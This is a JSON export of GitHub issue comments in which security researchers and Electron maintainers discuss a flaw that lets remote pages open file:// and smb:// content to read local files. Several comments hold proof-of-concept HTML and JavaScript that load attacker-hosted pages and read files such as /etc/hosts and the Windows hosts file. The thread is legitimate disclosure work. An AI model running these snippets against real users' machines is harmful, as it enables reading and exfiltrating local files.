[
  {
    "url": "https://api.github.com/repos/electron/electron/issues/comments/210128489",
    "html_url": "https://github.com/electron/electron/issues/5151#issuecomment-210128489",
    "issue_url": "https://api.github.com/repos/electron/electron/issues/5151",
    "id": 210128489,
    "user": {
      "login": "bengotow",
      "id": 1037212,
      "avatar_url": "https://avatars0.githubusercontent.com/u/1037212?v=3",
      "gravatar_id": "",
      "url": "https://api.github.com/users/bengotow",
      "html_url": "https://github.com/bengotow",
      "followers_url": "https://api.github.com/users/bengotow/followers",
      "following_url": "https://api.github.com/users/bengotow/following{/other_user}",
      "gists_url": "https://api.github.com/users/bengotow/gists{/gist_id}",
      "starred_url": "https://api.github.com/users/bengotow/starred{/owner}{/repo}",
      "subscriptions_url": "https://api.github.com/users/bengotow/subscriptions",
      "organizations_url": "https://api.github.com/users/bengotow/orgs",
      "repos_url": "https://api.github.com/users/bengotow/repos",
      "events_url": "https://api.github.com/users/bengotow/events{/privacy}",
      "received_events_url": "https://api.github.com/users/bengotow/received_events",
      "type": "User",
      "site_admin": false
    },
    "created_at": "2016-04-14T20:10:53Z",
    "updated_at": "2016-04-14T20:10:53Z",
    "body": "Hey! This definitely seems like a good scenario to catch, but I'm not sure I understand. In your example, you're reading an HTML file from `file://`, not the internet, right? Does this exploit depend on malicious code already being on the user's computer, or is Electron translating `window.open(\"file://attacker.example.com/test.html\");` to `window.open(\"http://attacker.example.com/test.html\");`?\n"
  },
  {
    "url": "https://api.github.com/repos/electron/electron/issues/comments/210295869",
    "html_url": "https://github.com/electron/electron/issues/5151#issuecomment-210295869",
    "issue_url": "https://api.github.com/repos/electron/electron/issues/5151",
    "id": 210295869,
    "user": {
      "login": "harupu",
      "id": 7601382,
      "avatar_url": "https://avatars2.githubusercontent.com/u/7601382?v=3",
      "gravatar_id": "",
      "url": "https://api.github.com/users/harupu",
      "html_url": "https://github.com/harupu",
      "followers_url": "https://api.github.com/users/harupu/followers",
      "following_url": "https://api.github.com/users/harupu/following{/other_user}",
      "gists_url": "https://api.github.com/users/harupu/gists{/gist_id}",
      "starred_url": "https://api.github.com/users/harupu/starred{/owner}{/repo}",
      "subscriptions_url": "https://api.github.com/users/harupu/subscriptions",
      "organizations_url": "https://api.github.com/users/harupu/orgs",
      "repos_url": "https://api.github.com/users/harupu/repos",
      "events_url": "https://api.github.com/users/harupu/events{/privacy}",
      "received_events_url": "https://api.github.com/users/harupu/received_events",
      "type": "User",
      "site_admin": false
    },
    "created_at": "2016-04-15T05:45:32Z",
    "updated_at": "2016-04-15T05:45:32Z",
    "body": "Usually, browsers prohibit to open file scheme from web pages on the internet but by using window.open, you can open file:// from the internet. \nFor example, followings on the internet (http://attacker.example.com/driver.html) don't work:\n\n```\n<a href=\"file://attacker.example.com/test.html\">test</a>\n<iframe src=\"file://attacker.example.com/test.html\"></iframe>\n<script>\nlocation.href=\"file://attacker.example.com/test.html\";\nlocation.replace(\"file://attacker.example.com/test.html\");\n</script>\n```\n\nBut, this works:\n\n```\n<script>\nwindow.open(\"file://attacker.example.com/test.html\");\n</script>\n```\n\nThis is caused by override.js:\nhttps://github.com/electron/electron/blob/master/lib/renderer/override.js#L78\n\nYou can confirm it from developer console by typing funcation name: \n\n```\n> window.open\nfunction (url, frameName, features) {\n  var feature, guestId, i, j, len, len1, name, options, ref1, ref2, value\n  if (frameName == null) {\n    frameName = ''\n  }\n  if (features == null) {\n    feâ€¦\n> location.replace\nfunction () { [native code] }\n```\n\nAn attacker have to use Samba server to handle file scheme like 'file://attacker.example.com/test.html'.\n"
  },
  {
    "url": "https://api.github.com/repos/electron/electron/issues/comments/210375428",
    "html_url": "https://github.com/electron/electron/issues/5151#issuecomment-210375428",
    "issue_url": "https://api.github.com/repos/electron/electron/issues/5151",
    "id": 210375428,
    "user": {
      "login": "laramies",
      "id": 543611,
      "avatar_url": "https://avatars0.githubusercontent.com/u/543611?v=3",
      "gravatar_id": "",
      "url": "https://api.github.com/users/laramies",
      "html_url": "https://github.com/laramies",
      "followers_url": "https://api.github.com/users/laramies/followers",
      "following_url": "https://api.github.com/users/laramies/following{/other_user}",
      "gists_url": "https://api.github.com/users/laramies/gists{/gist_id}",
      "starred_url": "https://api.github.com/users/laramies/starred{/owner}{/repo}",
      "subscriptions_url": "https://api.github.com/users/laramies/subscriptions",
      "organizations_url": "https://api.github.com/users/laramies/orgs",
      "repos_url": "https://api.github.com/users/laramies/repos",
      "events_url": "https://api.github.com/users/laramies/events{/privacy}",
      "received_events_url": "https://api.github.com/users/laramies/received_events",
      "type": "User",
      "site_admin": false
    },
    "created_at": "2016-04-15T09:10:30Z",
    "updated_at": "2016-04-15T09:10:30Z",
    "body": "Hi, with the same code as your example, I don't get any browser-window-created event for:\n\n`<iframe src=\"file://localhost/c:/windows/system32/drivers/etc/hosts\" onload=\"alert(iframe.contentDocument.body.innerHTML)\" id=\"iframe\"></iframe>\n`\nIt works for:\n\n`<script>window.open(\"index2.html\",\"\",\"nodeIntegration=1\");</script>\n`\nAlso I can't get the event for webviews.. Any idea why?\n"
  },
  {
    "url": "https://api.github.com/repos/electron/electron/issues/comments/210402812",
    "html_url": "https://github.com/electron/electron/issues/5151#issuecomment-210402812",
    "issue_url": "https://api.github.com/repos/electron/electron/issues/5151",
    "id": 210402812,
    "user": {
      "login": "harupu",
      "id": 7601382,
      "avatar_url": "https://avatars2.githubusercontent.com/u/7601382?v=3",
      "gravatar_id": "",
      "url": "https://api.github.com/users/harupu",
      "html_url": "https://github.com/harupu",
      "followers_url": "https://api.github.com/users/harupu/followers",
      "following_url": "https://api.github.com/users/harupu/following{/other_user}",
      "gists_url": "https://api.github.com/users/harupu/gists{/gist_id}",
      "starred_url": "https://api.github.com/users/harupu/starred{/owner}{/repo}",
      "subscriptions_url": "https://api.github.com/users/harupu/subscriptions",
      "organizations_url": "https://api.github.com/users/harupu/orgs",
      "repos_url": "https://api.github.com/users/harupu/repos",
      "events_url": "https://api.github.com/users/harupu/events{/privacy}",
      "received_events_url": "https://api.github.com/users/harupu/received_events",
      "type": "User",
      "site_admin": false
    },
    "created_at": "2016-04-15T10:16:28Z",
    "updated_at": "2016-04-15T10:36:53Z",
    "body": "It seems that window.open calls ipcRenderer.sendSync with 'ELECTRON_GUEST_WINDOW_MANAGER_WINDOW_OPEN':\nhttps://github.com/electron/electron/blob/master/lib/renderer/override.js#L138\n\nThen, [ipcMain handles this message](https://github.com/electron/electron/blob/master/lib/browser/guest-window-manager.js#L89) and [create new BrowserWindow](https://github.com/electron/electron/blob/master/lib/browser/guest-window-manager.js#L61) on main process side.\n\nI think other webview events and chromium native codes don't send such IPC events to main process and main process cannot catch.\n"
  },
  {
    "url": "https://api.github.com/repos/electron/electron/issues/comments/210414406",
    "html_url": "https://github.com/electron/electron/issues/5151#issuecomment-210414406",
    "issue_url": "https://api.github.com/repos/electron/electron/issues/5151",
    "id": 210414406,
    "user": {
      "login": "zcbenz",
      "id": 639601,
      "avatar_url": "https://avatars3.githubusercontent.com/u/639601?v=3",
      "gravatar_id": "",
      "url": "https://api.github.com/users/zcbenz",
      "html_url": "https://github.com/zcbenz",
      "followers_url": "https://api.github.com/users/zcbenz/followers",
      "following_url": "https://api.github.com/users/zcbenz/following{/other_user}",
      "gists_url": "https://api.github.com/users/zcbenz/gists{/gist_id}",
      "starred_url": "https://api.github.com/users/zcbenz/starred{/owner}{/repo}",
      "subscriptions_url": "https://api.github.com/users/zcbenz/subscriptions",
      "organizations_url": "https://api.github.com/users/zcbenz/orgs",
      "repos_url": "https://api.github.com/users/zcbenz/repos",
      "events_url": "https://api.github.com/users/zcbenz/events{/privacy}",
      "received_events_url": "https://api.github.com/users/zcbenz/received_events",
      "type": "User",
      "site_admin": true
    },
    "created_at": "2016-04-15T10:57:40Z",
    "updated_at": "2016-04-15T10:57:40Z",
    "body": "In Electron the `window.opener` is not fully implemented, so even it is possible to use `window.open` to open a local file, it is impossible to get the content of it.\n"
  },
  {
    "url": "https://api.github.com/repos/electron/electron/issues/comments/210428605",
    "html_url": "https://github.com/electron/electron/issues/5151#issuecomment-210428605",
    "issue_url": "https://api.github.com/repos/electron/electron/issues/5151",
    "id": 210428605,
    "user": {
      "login": "laramies",
      "id": 543611,
      "avatar_url": "https://avatars0.githubusercontent.com/u/543611?v=3",
      "gravatar_id": "",
      "url": "https://api.github.com/users/laramies",
      "html_url": "https://github.com/laramies",
      "followers_url": "https://api.github.com/users/laramies/followers",
      "following_url": "https://api.github.com/users/laramies/following{/other_user}",
      "gists_url": "https://api.github.com/users/laramies/gists{/gist_id}",
      "starred_url": "https://api.github.com/users/laramies/starred{/owner}{/repo}",
      "subscriptions_url": "https://api.github.com/users/laramies/subscriptions",
      "organizations_url": "https://api.github.com/users/laramies/orgs",
      "repos_url": "https://api.github.com/users/laramies/repos",
      "events_url": "https://api.github.com/users/laramies/events{/privacy}",
      "received_events_url": "https://api.github.com/users/laramies/received_events",
      "type": "User",
      "site_admin": false
    },
    "created_at": "2016-04-15T11:39:46Z",
    "updated_at": "2016-04-15T11:53:21Z",
    "body": "@zcbenz how can I block something like this, assuming it is being injected by a XSS:\n\n`<iframe src=\"file://localhost/c:/windows/system32/drivers/etc/hosts\" onload=\"alert(iframe.contentDocument.body.innerHTML)\" id=\"iframe\"></iframe>\n`\n\nInstead of an alert let's assume we send the file to a server via a post request for example.\n"
  },
  {
    "url": "https://api.github.com/repos/electron/electron/issues/comments/210432734",
    "html_url": "https://github.com/electron/electron/issues/5151#issuecomment-210432734",
    "issue_url": "https://api.github.com/repos/electron/electron/issues/5151",
    "id": 210432734,
    "user": {
      "login": "harupu",
      "id": 7601382,
      "avatar_url": "https://avatars2.githubusercontent.com/u/7601382?v=3",
      "gravatar_id": "",
      "url": "https://api.github.com/users/harupu",
      "html_url": "https://github.com/harupu",
      "followers_url": "https://api.github.com/users/harupu/followers",
      "following_url": "https://api.github.com/users/harupu/following{/other_user}",
      "gists_url": "https://api.github.com/users/harupu/gists{/gist_id}",
      "starred_url": "https://api.github.com/users/harupu/starred{/owner}{/repo}",
      "subscriptions_url": "https://api.github.com/users/harupu/subscriptions",
      "organizations_url": "https://api.github.com/users/harupu/orgs",
      "repos_url": "https://api.github.com/users/harupu/repos",
      "events_url": "https://api.github.com/users/harupu/events{/privacy}",
      "received_events_url": "https://api.github.com/users/harupu/received_events",
      "type": "User",
      "site_admin": false
    },
    "created_at": "2016-04-15T11:45:55Z",
    "updated_at": "2016-04-15T11:46:03Z",
    "body": ">  it is possible to use window.open to open a local file\n\nwindow.open can open a remote file with file scheme. Then, it is possible to get contents of local files from a remote file because there is no same-origin policy when using file scheme.\n"
  },
  {
    "url": "https://api.github.com/repos/electron/electron/issues/comments/210436503",
    "html_url": "https://github.com/electron/electron/issues/5151#issuecomment-210436503",
    "issue_url": "https://api.github.com/repos/electron/electron/issues/5151",
    "id": 210436503,
    "user": {
      "login": "zcbenz",
      "id": 639601,
      "avatar_url": "https://avatars3.githubusercontent.com/u/639601?v=3",
      "gravatar_id": "",
      "url": "https://api.github.com/users/zcbenz",
      "html_url": "https://github.com/zcbenz",
      "followers_url": "https://api.github.com/users/zcbenz/followers",
      "following_url": "https://api.github.com/users/zcbenz/following{/other_user}",
      "gists_url": "https://api.github.com/users/zcbenz/gists{/gist_id}",
      "starred_url": "https://api.github.com/users/zcbenz/starred{/owner}{/repo}",
      "subscriptions_url": "https://api.github.com/users/zcbenz/subscriptions",
      "organizations_url": "https://api.github.com/users/zcbenz/orgs",
      "repos_url": "https://api.github.com/users/zcbenz/repos",
      "events_url": "https://api.github.com/users/zcbenz/events{/privacy}",
      "received_events_url": "https://api.github.com/users/zcbenz/received_events",
      "type": "User",
      "site_admin": true
    },
    "created_at": "2016-04-15T11:51:46Z",
    "updated_at": "2016-04-15T11:51:46Z",
    "body": "Since this is basically the natural of `file://` protocol, I don't think we are able to solve this without breaking web standards. In Electron users can use the [protocol](http://electron.atom.io/docs/v0.37.5/api/protocol/#protocol) module to load the page with custom protocol, without the security problems of `file://` protocol.\n"
  },
  {
    "url": "https://api.github.com/repos/electron/electron/issues/comments/210437507",
    "html_url": "https://github.com/electron/electron/issues/5151#issuecomment-210437507",
    "issue_url": "https://api.github.com/repos/electron/electron/issues/5151",
    "id": 210437507,
    "user": {
      "login": "laramies",
      "id": 543611,
      "avatar_url": "https://avatars0.githubusercontent.com/u/543611?v=3",
      "gravatar_id": "",
      "url": "https://api.github.com/users/laramies",
      "html_url": "https://github.com/laramies",
      "followers_url": "https://api.github.com/users/laramies/followers",
      "following_url": "https://api.github.com/users/laramies/following{/other_user}",
      "gists_url": "https://api.github.com/users/laramies/gists{/gist_id}",
      "starred_url": "https://api.github.com/users/laramies/starred{/owner}{/repo}",
      "subscriptions_url": "https://api.github.com/users/laramies/subscriptions",
      "organizations_url": "https://api.github.com/users/laramies/orgs",
      "repos_url": "https://api.github.com/users/laramies/repos",
      "events_url": "https://api.github.com/users/laramies/events{/privacy}",
      "received_events_url": "https://api.github.com/users/laramies/received_events",
      "type": "User",
      "site_admin": false
    },
    "created_at": "2016-04-15T11:57:26Z",
    "updated_at": "2016-04-15T11:57:26Z",
    "body": "@zcbenz [protocol ](http://electron.atom.io/docs/v0.37.5/api/protocol/#protocol)module will also apply to Preload, right?  I am looking a solution to this https://github.com/electron/electron/issues/5173\n"
  },
  {
    "url": "https://api.github.com/repos/electron/electron/issues/comments/210438333",
    "html_url": "https://github.com/electron/electron/issues/5151#issuecomment-210438333",
    "issue_url": "https://api.github.com/repos/electron/electron/issues/5151",
    "id": 210438333,
    "user": {
      "login": "zcbenz",
      "id": 639601,
      "avatar_url": "https://avatars3.githubusercontent.com/u/639601?v=3",
      "gravatar_id": "",
      "url": "https://api.github.com/users/zcbenz",
      "html_url": "https://github.com/zcbenz",
      "followers_url": "https://api.github.com/users/zcbenz/followers",
      "following_url": "https://api.github.com/users/zcbenz/following{/other_user}",
      "gists_url": "https://api.github.com/users/zcbenz/gists{/gist_id}",
      "starred_url": "https://api.github.com/users/zcbenz/starred{/owner}{/repo}",
      "subscriptions_url": "https://api.github.com/users/zcbenz/subscriptions",
      "organizations_url": "https://api.github.com/users/zcbenz/orgs",
      "repos_url": "https://api.github.com/users/zcbenz/repos",
      "events_url": "https://api.github.com/users/zcbenz/events{/privacy}",
      "received_events_url": "https://api.github.com/users/zcbenz/received_events",
      "type": "User",
      "site_admin": true
    },
    "created_at": "2016-04-15T12:01:29Z",
    "updated_at": "2016-04-15T12:01:29Z",
    "body": "Yeah preload scripts work in custom protocols.\n"
  },
  {
    "url": "https://api.github.com/repos/electron/electron/issues/comments/210471652",
    "html_url": "https://github.com/electron/electron/issues/5151#issuecomment-210471652",
    "issue_url": "https://api.github.com/repos/electron/electron/issues/5151",
    "id": 210471652,
    "user": {
      "login": "harupu",
      "id": 7601382,
      "avatar_url": "https://avatars2.githubusercontent.com/u/7601382?v=3",
      "gravatar_id": "",
      "url": "https://api.github.com/users/harupu",
      "html_url": "https://github.com/harupu",
      "followers_url": "https://api.github.com/users/harupu/followers",
      "following_url": "https://api.github.com/users/harupu/following{/other_user}",
      "gists_url": "https://api.github.com/users/harupu/gists{/gist_id}",
      "starred_url": "https://api.github.com/users/harupu/starred{/owner}{/repo}",
      "subscriptions_url": "https://api.github.com/users/harupu/subscriptions",
      "organizations_url": "https://api.github.com/users/harupu/orgs",
      "repos_url": "https://api.github.com/users/harupu/repos",
      "events_url": "https://api.github.com/users/harupu/events{/privacy}",
      "received_events_url": "https://api.github.com/users/harupu/received_events",
      "type": "User",
      "site_admin": false
    },
    "created_at": "2016-04-15T13:52:37Z",
    "updated_at": "2016-04-15T13:52:37Z",
    "body": "@zcbenz Same-origin policy is also an important element of web standards. In this case, a script of remote origin can read local resources in spite of different origins(hosts). We must check origin to follow same-origin policy rule when file scheme is used. \nIf it is difficult to implement, calling file:// from remote web pages should be prohibited. Standard browsers prohibit to call file:// from remote web pages.\n"
  },
  {
    "url": "https://api.github.com/repos/electron/electron/issues/comments/210479206",
    "html_url": "https://github.com/electron/electron/issues/5151#issuecomment-210479206",
    "issue_url": "https://api.github.com/repos/electron/electron/issues/5151",
    "id": 210479206,
    "user": {
      "login": "zcbenz",
      "id": 639601,
      "avatar_url": "https://avatars3.githubusercontent.com/u/639601?v=3",
      "gravatar_id": "",
      "url": "https://api.github.com/users/zcbenz",
      "html_url": "https://github.com/zcbenz",
      "followers_url": "https://api.github.com/users/zcbenz/followers",
      "following_url": "https://api.github.com/users/zcbenz/following{/other_user}",
      "gists_url": "https://api.github.com/users/zcbenz/gists{/gist_id}",
      "starred_url": "https://api.github.com/users/zcbenz/starred{/owner}{/repo}",
      "subscriptions_url": "https://api.github.com/users/zcbenz/subscriptions",
      "organizations_url": "https://api.github.com/users/zcbenz/orgs",
      "repos_url": "https://api.github.com/users/zcbenz/repos",
      "events_url": "https://api.github.com/users/zcbenz/events{/privacy}",
      "received_events_url": "https://api.github.com/users/zcbenz/received_events",
      "type": "User",
      "site_admin": true
    },
    "created_at": "2016-04-15T14:16:35Z",
    "updated_at": "2016-04-15T14:16:35Z",
    "body": "Same-origin policy is enforced in remote pages in Electron, it is just `window.open` not following it (and we should fix it), but there is no security problems with it because the opener window can not access the content of new window in Electron.\n"
  },
  {
    "url": "https://api.github.com/repos/electron/electron/issues/comments/210485620",
    "html_url": "https://github.com/electron/electron/issues/5151#issuecomment-210485620",
    "issue_url": "https://api.github.com/repos/electron/electron/issues/5151",
    "id": 210485620,
    "user": {
      "login": "harupu",
      "id": 7601382,
      "avatar_url": "https://avatars2.githubusercontent.com/u/7601382?v=3",
      "gravatar_id": "",
      "url": "https://api.github.com/users/harupu",
      "html_url": "https://github.com/harupu",
      "followers_url": "https://api.github.com/users/harupu/followers",
      "following_url": "https://api.github.com/users/harupu/following{/other_user}",
      "gists_url": "https://api.github.com/users/harupu/gists{/gist_id}",
      "starred_url": "https://api.github.com/users/harupu/starred{/owner}{/repo}",
      "subscriptions_url": "https://api.github.com/users/harupu/subscriptions",
      "organizations_url": "https://api.github.com/users/harupu/orgs",
      "repos_url": "https://api.github.com/users/harupu/repos",
      "events_url": "https://api.github.com/users/harupu/events{/privacy}",
      "received_events_url": "https://api.github.com/users/harupu/received_events",
      "type": "User",
      "site_admin": false
    },
    "created_at": "2016-04-15T14:36:06Z",
    "updated_at": "2016-04-15T14:36:06Z",
    "body": "The opener window cannot access new window but new window load remote contents with file://. Then, remote contents with file:// can open local files and read it. I think It is security problem. file://attaker.example.com should be treated as a remote content.\n"
  },
  {
    "url": "https://api.github.com/repos/electron/electron/issues/comments/210488846",
    "html_url": "https://github.com/electron/electron/issues/5151#issuecomment-210488846",
    "issue_url": "https://api.github.com/repos/electron/electron/issues/5151",
    "id": 210488846,
    "user": {
      "login": "zcbenz",
      "id": 639601,
      "avatar_url": "https://avatars3.githubusercontent.com/u/639601?v=3",
      "gravatar_id": "",
      "url": "https://api.github.com/users/zcbenz",
      "html_url": "https://github.com/zcbenz",
      "followers_url": "https://api.github.com/users/zcbenz/followers",
      "following_url": "https://api.github.com/users/zcbenz/following{/other_user}",
      "gists_url": "https://api.github.com/users/zcbenz/gists{/gist_id}",
      "starred_url": "https://api.github.com/users/zcbenz/starred{/owner}{/repo}",
      "subscriptions_url": "https://api.github.com/users/zcbenz/subscriptions",
      "organizations_url": "https://api.github.com/users/zcbenz/orgs",
      "repos_url": "https://api.github.com/users/zcbenz/repos",
      "events_url": "https://api.github.com/users/zcbenz/events{/privacy}",
      "received_events_url": "https://api.github.com/users/zcbenz/received_events",
      "type": "User",
      "site_admin": true
    },
    "created_at": "2016-04-15T14:45:02Z",
    "updated_at": "2016-04-15T14:45:02Z",
    "body": "Can you show how to load remote contents with `file://`? I tried `window.open('file://github.com/')` but it seems to open empty page?\n"
  },
  {
    "url": "https://api.github.com/repos/electron/electron/issues/comments/210499458",
    "html_url": "https://github.com/electron/electron/issues/5151#issuecomment-210499458",
    "issue_url": "https://api.github.com/repos/electron/electron/issues/5151",
    "id": 210499458,
    "user": {
      "login": "harupu",
      "id": 7601382,
      "avatar_url": "https://avatars2.githubusercontent.com/u/7601382?v=3",
      "gravatar_id": "",
      "url": "https://api.github.com/users/harupu",
      "html_url": "https://github.com/harupu",
      "followers_url": "https://api.github.com/users/harupu/followers",
      "following_url": "https://api.github.com/users/harupu/following{/other_user}",
      "gists_url": "https://api.github.com/users/harupu/gists{/gist_id}",
      "starred_url": "https://api.github.com/users/harupu/starred{/owner}{/repo}",
      "subscriptions_url": "https://api.github.com/users/harupu/subscriptions",
      "organizations_url": "https://api.github.com/users/harupu/orgs",
      "repos_url": "https://api.github.com/users/harupu/repos",
      "events_url": "https://api.github.com/users/harupu/events{/privacy}",
      "received_events_url": "https://api.github.com/users/harupu/received_events",
      "type": "User",
      "site_admin": false
    },
    "created_at": "2016-04-15T15:11:39Z",
    "updated_at": "2016-04-15T15:11:39Z",
    "body": "To show contents, we need a samba server and HTML contents. Since Electron doesn't show directory listing page, file path should be specified like `file://192.168.56.101/public/test.html` Unfortunately, I have no public samba servers and couldn't find public one... Could you please test it with your samba server?\n"
  },
  {
    "url": "https://api.github.com/repos/electron/electron/issues/comments/210506954",
    "html_url": "https://github.com/electron/electron/issues/5151#issuecomment-210506954",
    "issue_url": "https://api.github.com/repos/electron/electron/issues/5151",
    "id": 210506954,
    "user": {
      "login": "laramies",
      "id": 543611,
      "avatar_url": "https://avatars0.githubusercontent.com/u/543611?v=3",
      "gravatar_id": "",
      "url": "https://api.github.com/users/laramies",
      "html_url": "https://github.com/laramies",
      "followers_url": "https://api.github.com/users/laramies/followers",
      "following_url": "https://api.github.com/users/laramies/following{/other_user}",
      "gists_url": "https://api.github.com/users/laramies/gists{/gist_id}",
      "starred_url": "https://api.github.com/users/laramies/starred{/owner}{/repo}",
      "subscriptions_url": "https://api.github.com/users/laramies/subscriptions",
      "organizations_url": "https://api.github.com/users/laramies/orgs",
      "repos_url": "https://api.github.com/users/laramies/repos",
      "events_url": "https://api.github.com/users/laramies/events{/privacy}",
      "received_events_url": "https://api.github.com/users/laramies/received_events",
      "type": "User",
      "site_admin": false
    },
    "created_at": "2016-04-15T15:29:57Z",
    "updated_at": "2016-04-15T15:29:57Z",
    "body": "I just tried it, and I get:\n\n`Not allowed to load local resource: file://192.168.0.27/temp/test.html/\n`\n\nI have this in index.html:\n\n`<script>window.open('file://192.168.0.27/temp/test.html/')</script>\n`\n\nAnd this in test.html:\n\n```\n<html>\n<body>\n<h1>Hello</h1>\n<iframe src=\"file://localhost/c:/windows/system32/drivers/etc/hosts\" onload=\"alert(iframe.contentDocument.body.innerHTML)\" id=\"iframe\"></iframe>\n</body>\n</html>\n```\n\nStill the same can be achieved via loading a remote JS via e via Preload:\n\n`<webview src=\"http://www.test.com\" preload=\"file:\\\\192.168.0.27\\temp\\test.js\"></webview>\n`\n"
  },
  {
    "url": "https://api.github.com/repos/electron/electron/issues/comments/210716233",
    "html_url": "https://github.com/electron/electron/issues/5151#issuecomment-210716233",
    "issue_url": "https://api.github.com/repos/electron/electron/issues/5151",
    "id": 210716233,
    "user": {
      "login": "zcbenz",
      "id": 639601,
      "avatar_url": "https://avatars3.githubusercontent.com/u/639601?v=3",
      "gravatar_id": "",
      "url": "https://api.github.com/users/zcbenz",
      "html_url": "https://github.com/zcbenz",
      "followers_url": "https://api.github.com/users/zcbenz/followers",
      "following_url": "https://api.github.com/users/zcbenz/following{/other_user}",
      "gists_url": "https://api.github.com/users/zcbenz/gists{/gist_id}",
      "starred_url": "https://api.github.com/users/zcbenz/starred{/owner}{/repo}",
      "subscriptions_url": "https://api.github.com/users/zcbenz/subscriptions",
      "organizations_url": "https://api.github.com/users/zcbenz/orgs",
      "repos_url": "https://api.github.com/users/zcbenz/repos",
      "events_url": "https://api.github.com/users/zcbenz/events{/privacy}",
      "received_events_url": "https://api.github.com/users/zcbenz/received_events",
      "type": "User",
      "site_admin": true
    },
    "created_at": "2016-04-16T02:20:55Z",
    "updated_at": "2016-04-16T02:20:55Z",
    "body": "@harupu I see the problem now, I didn't know it is possible to access samba servers with `file://` protocol. Thanks for the explanations!\n"
  },
  {
    "url": "https://api.github.com/repos/electron/electron/issues/comments/213116186",
    "html_url": "https://github.com/electron/electron/issues/5151#issuecomment-213116186",
    "issue_url": "https://api.github.com/repos/electron/electron/issues/5151",
    "id": 213116186,
    "user": {
      "login": "laramies",
      "id": 543611,
      "avatar_url": "https://avatars0.githubusercontent.com/u/543611?v=3",
      "gravatar_id": "",
      "url": "https://api.github.com/users/laramies",
      "html_url": "https://github.com/laramies",
      "followers_url": "https://api.github.com/users/laramies/followers",
      "following_url": "https://api.github.com/users/laramies/following{/other_user}",
      "gists_url": "https://api.github.com/users/laramies/gists{/gist_id}",
      "starred_url": "https://api.github.com/users/laramies/starred{/owner}{/repo}",
      "subscriptions_url": "https://api.github.com/users/laramies/subscriptions",
      "organizations_url": "https://api.github.com/users/laramies/orgs",
      "repos_url": "https://api.github.com/users/laramies/repos",
      "events_url": "https://api.github.com/users/laramies/events{/privacy}",
      "received_events_url": "https://api.github.com/users/laramies/received_events",
      "type": "User",
      "site_admin": false
    },
    "created_at": "2016-04-21T21:11:16Z",
    "updated_at": "2016-04-21T21:11:16Z",
    "body": "@zcbenz what will be the fix for this? enforcing SameOrigin in the Window.open?  And what about Preloads?  should they load only from local resources?  I know I can use a protocol handler for  file:/// but will be good to have a fix/option in Electron and not in my App.  And the same for Iframes, I would like to respect SOP and prevent a XSS from doing something like:\n\n`<iframe src=\"file://localhost/c:/windows/system32/drivers/etc/hosts\" onload=\"alert(iframe.contentDocument.body.innerHTML)\" id=\"iframe\"></iframe>\n`\n(instead of using alert an attacker will send the result to a server via an HTTP request)\n\nThanks again!\n"
  },
  {
    "url": "https://api.github.com/repos/electron/electron/issues/comments/213198115",
    "html_url": "https://github.com/electron/electron/issues/5151#issuecomment-213198115",
    "issue_url": "https://api.github.com/repos/electron/electron/issues/5151",
    "id": 213198115,
    "user": {
      "login": "zcbenz",
      "id": 639601,
      "avatar_url": "https://avatars3.githubusercontent.com/u/639601?v=3",
      "gravatar_id": "",
      "url": "https://api.github.com/users/zcbenz",
      "html_url": "https://github.com/zcbenz",
      "followers_url": "https://api.github.com/users/zcbenz/followers",
      "following_url": "https://api.github.com/users/zcbenz/following{/other_user}",
      "gists_url": "https://api.github.com/users/zcbenz/gists{/gist_id}",
      "starred_url": "https://api.github.com/users/zcbenz/starred{/owner}{/repo}",
      "subscriptions_url": "https://api.github.com/users/zcbenz/subscriptions",
      "organizations_url": "https://api.github.com/users/zcbenz/orgs",
      "repos_url": "https://api.github.com/users/zcbenz/repos",
      "events_url": "https://api.github.com/users/zcbenz/events{/privacy}",
      "received_events_url": "https://api.github.com/users/zcbenz/received_events",
      "type": "User",
      "site_admin": true
    },
    "created_at": "2016-04-22T01:22:29Z",
    "updated_at": "2016-04-22T01:22:52Z",
    "body": "@laramies Disabling `window.open` for `file://` in remote pages should be enough to fix this, of course enforcing same origin would be better. The preload problem will be gone once we fixed #3943, and currently preload script can only be a local file.\n"
  },
  {
    "url": "https://api.github.com/repos/electron/electron/issues/comments/213289754",
    "html_url": "https://github.com/electron/electron/issues/5151#issuecomment-213289754",
    "issue_url": "https://api.github.com/repos/electron/electron/issues/5151",
    "id": 213289754,
    "user": {
      "login": "harupu",
      "id": 7601382,
      "avatar_url": "https://avatars2.githubusercontent.com/u/7601382?v=3",
      "gravatar_id": "",
      "url": "https://api.github.com/users/harupu",
      "html_url": "https://github.com/harupu",
      "followers_url": "https://api.github.com/users/harupu/followers",
      "following_url": "https://api.github.com/users/harupu/following{/other_user}",
      "gists_url": "https://api.github.com/users/harupu/gists{/gist_id}",
      "starred_url": "https://api.github.com/users/harupu/starred{/owner}{/repo}",
      "subscriptions_url": "https://api.github.com/users/harupu/subscriptions",
      "organizations_url": "https://api.github.com/users/harupu/orgs",
      "repos_url": "https://api.github.com/users/harupu/repos",
      "events_url": "https://api.github.com/users/harupu/events{/privacy}",
      "received_events_url": "https://api.github.com/users/harupu/received_events",
      "type": "User",
      "site_admin": false
    },
    "created_at": "2016-04-22T06:47:10Z",
    "updated_at": "2016-04-22T06:47:10Z",
    "body": "The following is just FYI.\nIt seems that disabling window.open for `file://` in remote pages is better than enforcing same origin policy on `file://`. :-(\nI found this issue is a little difficult on mac. By using `smb://`, an attacker force a victim to mount remote samba server. This enable a malicious script to access remote server contents as local contents. \n(I did't know mac doesn't allow to access to remote host by file scheme.)\n\n``` javascript\nwindow.open(\"smb://guest:guest@192.168.56.104/public/\");\nsetTimeout(function(){\n  window.open(\"file:///Volumes/public/test.html\");\n}, 10000);\n```\n\ntest.html:\n\n```\n<iframe src=\"file:///etc/hosts\" onload=\"alert(this.contentDocument.body.innerHTML)\"></iframe>\n```\n"
  }
]